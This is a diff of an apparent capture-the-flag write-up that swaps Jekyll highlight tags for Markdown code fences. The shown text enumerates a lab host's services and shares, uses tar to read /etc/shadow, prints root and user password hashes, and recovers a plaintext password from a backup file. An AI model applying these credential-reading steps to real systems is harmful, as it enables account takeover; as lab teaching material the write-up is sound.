@@ -22,13 +22,13 @@ What services are running on the target?
 | 20000/tcp | MiniServ (Webmin httpd)                | 1.830   | Web-based admin system                                                                       |
 
 Running an `smbmap -H 192.168.68.109` checked for all the disks hosted:
-{% highlight shell %}
+```shell
 [+] IP: 192.168.68.109:10000	Name: 192.168.68.109                                    
         Disk                                                  	Permissions	Comment
 	----                                                  	-----------	-------
 	print$                                            	NO ACCESS	Printer Drivers
 	IPC$                                              	NO ACCESS	IPC Service (Samba 4.13.5-Debian)
-{% endhighlight %}
+```
 
 Running `gobuster` on the site also identified the `/server-status` which resulted in a 403 (Forbidden).
 
@@ -103,12 +103,12 @@ Targeting the `/etc/shadow` file we can get all the password hashes for the diff
 `tar -cvf shadow.tar /etc/shadow` to archive the dir
 `tar -xvf shadow.tar` to extract it
 
-{% highlight shell %}
+```shell
 $ cat shadow
 root:$y$j9T$M3BDdkxYOlVM6ECoqwUFs.$Wyz40CNLlZCFN6Xltv9AAZAJY5S3aDvLXp0tmJKlk6A:18919:0:9
 ...
 cyber:$y$j9T$x6sDj5S/H0RH4IGhi0c6x0$mIPyCIactTA3/gxTaI7zctfCt2.EOGXTOW4X9efAVW4:18919:0:
-{% endhighlight %}
+```
 
 Above would have forced me to crack the hash, so we check the `/var/backups/.old_pass.bak` using the same method, and we find an old password:
 `Ts&4&YurgtRX(=~h`
